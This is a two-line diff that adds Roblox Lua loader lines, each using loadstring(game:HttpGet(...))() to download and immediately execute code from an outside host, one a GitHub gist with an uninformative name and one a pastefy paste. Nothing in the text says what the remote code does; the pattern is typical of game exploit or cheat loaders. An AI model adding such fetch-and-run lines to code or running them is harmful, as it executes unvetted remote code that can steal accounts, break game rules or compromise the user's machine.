@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/UCT-hub/f327582cf9d291ba21ae08742966fc4f/raw/b4cc929d026fa4f6adec4cf527bd11255d57c606/dasdasdsa", true))()
+loadstring(game:HttpGet("https://pastefy.app/1FPEhJmq/raw"))()
